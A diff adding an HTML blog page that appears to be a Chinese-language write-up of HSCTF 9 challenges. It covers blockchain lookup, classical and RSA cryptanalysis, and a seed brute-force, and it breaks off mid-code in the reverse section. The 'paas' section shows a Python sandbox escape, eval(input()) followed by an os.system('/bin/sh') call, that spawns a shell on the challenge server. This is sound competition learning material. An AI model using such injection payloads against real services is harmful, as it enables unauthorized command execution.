@@ -1,0 +1,511 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/banner/piano_man.png">
+  <link rel="icon" href="/banner/piano_man.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lanpesk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HSCTF 9">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HSCTF 9">
+<meta property="og:url" content="http://example.com/2022/06/12/HSCTF-9/index.html">
+<meta property="og:site_name" content="lanpesk">
+<meta property="og:description" content="HSCTF 9">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-12T03:31:29.000Z">
+<meta property="article:modified_time" content="2022-06-12T03:31:29.127Z">
+<meta property="article:author" content="lanpesk">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="MISC">
+<meta property="article:tag" content="Reverse">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>HSCTF 9 - lanpesk</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lanpesk</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://s2.loli.net/2022/05/01/YwbfzI9vkWMaVc2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="HSCTF 9">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-12 11:31" pubdate>
+        2022年6月12日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HSCTF 9</h1>
+            
+            <div class="markdown-body">
+              <p>HSCTF 9</p>
+<span id="more"></span>
+<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
+<h2 id="the-great-directory-egg-hunt"><a class="markdownIt-Anchor" href="#the-great-directory-egg-hunt"></a> the-great-directory-egg-hunt</h2>
+<p>Description：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs livecodeserver">Lots <span class="hljs-keyword">of</span> branching paths, but how <span class="hljs-built_in">do</span> we <span class="hljs-built_in">get</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> correct <span class="hljs-built_in">file</span>?<br></code></pre></td></tr></table></figure>
+<p>附件是一个压缩包。<br />
+解压后里面目录很多。每个叶子都是一个file.txt文件。看来我们需要在这里面找到我们的flag。<br />
+这个直接用windows自带的搜索就行了。不过要打开搜索文件内容的选项。</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">.\Tw\<span class="hljs-number">3</span>l\v3\_D\<span class="hljs-number">1</span>r\s_\D3\<span class="hljs-number">3</span>p\_6\Gi\TQ\Ez<br></code></pre></td></tr></table></figure>
+<p>这个目录下找到了相关文件。内容为：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If you followed <span class="hljs-keyword">the</span> <span class="hljs-built_in">directories</span> <span class="hljs-built_in">to</span> here, you have found <span class="hljs-keyword">the</span> flag!<br>Use <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> names (<span class="hljs-keyword">without</span> slashes) <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> flag, <span class="hljs-keyword">then</span> <span class="hljs-keyword">wrap</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> flag <span class="hljs-built_in">format</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>.<br></code></pre></td></tr></table></figure>
+<p>那么flag为：</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Tw3lv3_D1rs_D33p_6GiTQEz&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="onchain-baller"><a class="markdownIt-Anchor" href="#onchain-baller"></a> onchain-baller</h2>
+<p>Description：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">Have <span class="hljs-keyword">this</span> Ropsten testnet address: <span class="hljs-number">0x339d58bff8b8C5dAAfaF08fA77ad39C7909B194E</span><br></code></pre></td></tr></table></figure>
+<p>这个是以太坊的题。给了一个账户地址。找找看。<br />
+<a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/blocks">https://ropsten.etherscan.io/blocks</a><br />
+搜索这个地址。可以找到这个账户，这里有部分交易记录。<br />
+在Txn Hash为0xce01ddd8ad56b6b9b11796f9ebf1cd29e7034d82ff98978f2c4178a91a34cf46的交易中，其input data为：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">0</span>x68736374667b315f623431315f306e5f346e645f3066665f7468335f636834316e7d<br><br><span class="hljs-meta"># hsctf&#123;1_b411_0n_4nd_0ff_th3_ch41n&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="paas"><a class="markdownIt-Anchor" href="#paas"></a> paas</h2>
+<p>Description：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">Run</span> Python code <span class="hljs-keyword">from</span> anywhere! nc paas.hsctf.com 1337<br></code></pre></td></tr></table></figure>
+<p>nc连上后发现输入的代码都会被执行。但是他过滤了很多字符。比如 &quot;./_’&quot;这些。但是没有过滤括号。所以我们可以使用函数的。那么直接使用eval和input的组合就可以执行指令了。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">== proof-of-work: disabled ==</span><br>Python as a Service:<br>Execute arbitrary Python code (with certain restrictions)<br>&gt; eval(input())<br><span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).system(<span class="hljs-emphasis">&#x27;/bin/sh&#x27;</span>)<br>ls<br>flag<br>paas.py<br>cat flag<br>flag&#123;vuln3r4b1l17y_45_4_53rv1c3&#125;<br><br># flag&#123;vuln3r4b1l17y_45_4_53rv1c3&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
+<h2 id="lcvc"><a class="markdownIt-Anchor" href="#lcvc"></a> lcvc</h2>
+<p>Description：</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Ciphertext: mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw Please wrap <span class="hljs-built_in">in</span> the <span class="hljs-built_in">flag</span> <span class="hljs-built_in">format</span>: <span class="hljs-built_in">flag</span>&#123;&#125;<br></code></pre></td></tr></table></figure>
+<p>一个附件，是加密算法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">state = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;[REDACTED]&quot;</span><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="hljs-keyword">assert</span>(flag[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]+flag[-<span class="hljs-number">1</span>]==<span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>)<br>ciphertext = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> character <span class="hljs-keyword">in</span> flag[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]:<br>    state = (<span class="hljs-number">15</span>*state+<span class="hljs-number">18</span>)%<span class="hljs-number">29</span><br>    ciphertext+=alphabet[(alphabet.index(character)+state)%<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>(ciphertext)<br></code></pre></td></tr></table></figure>
+<p>这里直接爆破就行了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"> state = <span class="hljs-number">1</span><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>c = <span class="hljs-string">&quot;mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c :<br>    state = (<span class="hljs-number">15</span> * state + <span class="hljs-number">18</span>) % <span class="hljs-number">29</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:<br>        <span class="hljs-keyword">if</span> alphabet[(alphabet.index(j)+state)%<span class="hljs-number">26</span>] == i:<br>            <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher</span><br><span class="hljs-comment"># flag&#123;iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="quagmire-i"><a class="markdownIt-Anchor" href="#quagmire-i"></a> quagmire-i</h2>
+<p>Description：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Bob was <span class="hljs-keyword">on</span> his way <span class="hljs-keyword">to</span> school <span class="hljs-keyword">and</span> go <span class="hljs-keyword">to</span> Mr. Connolly’s <span class="hljs-keyword">first</span> period AP CSA <span class="hljs-built_in">class</span>, <span class="hljs-keyword">but</span> <span class="hljs-keyword">it</span> was a rainy <span class="hljs-built_in">day</span> <span class="hljs-keyword">and</span> he got stuck <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> quagmire <span class="hljs-keyword">in</span> his town, making him late <span class="hljs-keyword">to</span> school (specifically <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> closest <span class="hljs-keyword">to</span> his home, there are apparently four quagmires <span class="hljs-keyword">in</span> his town)! Could you figure out what Mr. Connolly told Bob’s <span class="hljs-built_in">class</span>? His classmate Alice sent this <span class="hljs-built_in">text</span> message <span class="hljs-keyword">after</span> <span class="hljs-built_in">class</span> (written <span class="hljs-keyword">in</span> Quagmire I):<br>```<br>Plaintext keyword: CONNOLLYROCKS<br>Indicator keyword: HSCTF<br>Indicator position: A<br>Ciphertext: LZXORNZBUYWNRARNOVGCLSQWJEFJFE<br>```<br>(Please wrap <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> flag format “flag&#123;&#125;”, <span class="hljs-keyword">and</span> use only uppercase letters within <span class="hljs-keyword">the</span> braces.)<br></code></pre></td></tr></table></figure>
+<p>不认识的加密，问问谷歌好了。找到一个解密的。</p>
+<p><a target="_blank" rel="noopener" href="https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/QuagmireI">https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/QuagmireI</a></p>
+<p>Keyed Alphabet key和Vigenere Key分别是CONNOLLYROCKS和HSCTF。解密即可。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">FILLTHISBOWLWITHYOURFAVEFRUITS</span><br><br><span class="hljs-comment"># flag&#123;FILLTHISBOWLWITHYOURFAVEFRUITS&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="baby-baby-rsa"><a class="markdownIt-Anchor" href="#baby-baby-rsa"></a> baby-baby-rsa</h2>
+<p>Description：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">You should <span class="hljs-keyword">do</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">by</span> hand.<br></code></pre></td></tr></table></figure>
+<p>两个附件一个算法一个输出。这里我放一起了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>bits = <span class="hljs-number">768</span><br>p,q = getPrime(bits),getPrime(bits)<br>n = p*q<br>e = <span class="hljs-number">0x10001</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(pt,e,n))<br>bit_p = <span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:]<br>bit_q = <span class="hljs-built_in">bin</span>(q)[<span class="hljs-number">2</span>:]<br>parts = [bit_p[<span class="hljs-number">0</span>:bits//<span class="hljs-number">3</span>],bit_p[bits//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>],bit_p[<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>:bits],bit_q[<span class="hljs-number">0</span>:bits//<span class="hljs-number">3</span>],bit_q[bits//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>],bit_q[<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>:bits]]<br>random.shuffle(parts)<br><span class="hljs-built_in">print</span>(parts)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">54794426723900547461854843163768660308115034417111329528183606035659639395104723918632912086419836023341428265596988959206660015436864401403237748771765948022232575597127381504670391300908215025163138869313954305720403722718214862988965792884236612959443476803344992121865817757791519151566895512058656532409472494022672998848036223706004788146906885182892250477746430460414866512005225936680732094537985671236900243908114730784290372829952741399684135984046796</span><br><span class="hljs-string">[&#x27;0100101100001100010110110001000001001110010110110011101111100001101100000101000011111000101110011010010100101100011111000000101010011101100101010000101101110100100010101011100110001010001000000001000110000111011110011001101111110000100010000110000001110011&#x27;, &#x27;1100001100001100111110011110110101001100100000000100000100011110110010010101000011111111000100001000111001100110010010010011110110110010010110110100010110100011011100101001100001010111000100000110101010101011011110110110101010110100011110010000101010000111&#x27;, &#x27;1000100010110110010100111010100100111000100111100101100001011111100011000111110011101011011011100000101011000111010110010010011110100100110000001101110111001000000111100111011011000101010001111101000111100111110010011101011111100100111111011011110110101111&#x27;, &#x27;1111001101111101111111111111001010001111100010100000010110011011100000000110010110000011011110101110001000001111110101101101111000000111101111111000011101011010000110111100000110000001001101101010100000010011000100010111100001011000101101111000101101110100&#x27;, &#x27;1100100000100001010111110010000011000010100110101111100100011010111111110100011011111100001011101001010000100111100011100111000101110001001011110000000000000000000110111100000111100000111111010110010011000010011000110111001010000110011011111101011110000101&#x27;, &#x27;0001101000011011010011100100000011010101110110111001111011000001010101101111110100011011010011111010001111011011100011111110101110101101111100100011111110011111010100001100011000111011010111110101000011110101011110110001011110001111011001101100110100000101&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>这里是把pq各拆成3份混在一起了。所以枚举一下就可以解决。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>c = ...<br>parts = [...]<br>e = <span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(parts, <span class="hljs-number">3</span>):<br>    p = libnum.s2n(libnum.b2s(<span class="hljs-string">&quot;&quot;</span>.join(i)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sympy.isprime(p):<br>        <span class="hljs-keyword">continue</span><br>    d = sympy.mod_inverse(e, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">pow</span>(c,d,p)))<br>    <br><span class="hljs-comment"># b&#x27;flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;&#x27;</span><br><span class="hljs-comment"># b&#x27;flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;&#x27;</span><br><span class="hljs-comment"># flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="otp"><a class="markdownIt-Anchor" href="#otp"></a> otp</h2>
+<p>Description：</p>
+<figure class="highlight mizar"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mizar">&quot;the one-time pad (OTP) <span class="hljs-keyword">is</span> an encryption technique <span class="hljs-keyword">that</span> cannot <span class="hljs-keyword">be</span> cracked&quot; - Wikipedia<br></code></pre></td></tr></table></figure>
+<p>两个文件一个输出一个代码，放一起了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secure_seed</span>():<br>	x = <span class="hljs-number">0</span><br>	<span class="hljs-comment"># x is a random integer between 0 and 100000000000</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000000</span>):<br>		x += random.randint(<span class="hljs-number">0</span>, random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>))<br>	<span class="hljs-keyword">return</span> x<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag = bytes_to_long(flag)<br><br>random.seed(secure_seed())<br><br>l = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(flag)) - <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(l)<br><br>k = random.getrandbits(l)<br>flag = flag ^ k <span class="hljs-comment"># super secure encryption</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># 328</span><br><span class="hljs-comment"># 444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span><br></code></pre></td></tr></table></figure>
+<p>没有啥思路，只能破解这个secure_seed是什么了。这个随机数的生成方式很奇怪。应为这样生成出来的随机数并不是在0~100000000000的，而是在25000000000附近的。这个结论你跑一个小规模的测试就能知道。即使这样我们很难去遍历他的周围，亿级别的搜索空间，好像也还是能遍历的。这边他生成出来的l还比flag多一位，我也不知道为啥，这里难道有什么可以利用的地方吗。</p>
+<p>尝试爆破一下吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>start = <span class="hljs-number">100000000000</span>//<span class="hljs-number">4</span><br>l = <span class="hljs-number">328</span><br>cipher = <span class="hljs-number">444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    random.seed(start + i)<br>    k = random.getrandbits(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> libnum.n2s(cipher^k):<br>        <span class="hljs-built_in">print</span>(start + i)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(cipher^k))<br>        <span class="hljs-keyword">break</span><br><br>    random.seed(start - i)<br>    k = random.getrandbits(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> libnum.n2s(cipher ^ k):<br>        <span class="hljs-built_in">print</span>(start - i)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(cipher ^ k))<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># 25000212790</span><br><span class="hljs-comment"># b&#x27;flag&#123;c3ntr4l_l1m1t_th30r3m_15431008597&#125;\r\n&#x27;</span><br><br><span class="hljs-comment"># flag&#123;c3ntr4l_l1m1t_th30r3m_15431008597&#125;</span><br></code></pre></td></tr></table></figure>
+<p>确实可以跑出来。</p>
+<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1>
+<h2 id="adding"><a class="markdownIt-Anchor" href="#adding"></a> adding</h2>
+<p>Description：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This program <span class="hljs-keyword">is</span> taking too long... oh well addition <span class="hljs-keyword">is</span> too hard <span class="hljs-keyword">for</span> <span class="hljs-keyword">me</span><br><br>Please wrap <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> proper flag format (flag&#123;&#125;).<br></code></pre></td></tr></table></figure>
+<p>看看代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">require = [], go = <span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> go:<br>        require.append(<span class="hljs-number">20</span>)<br>        <span class="hljs-keyword">return</span> require<br>        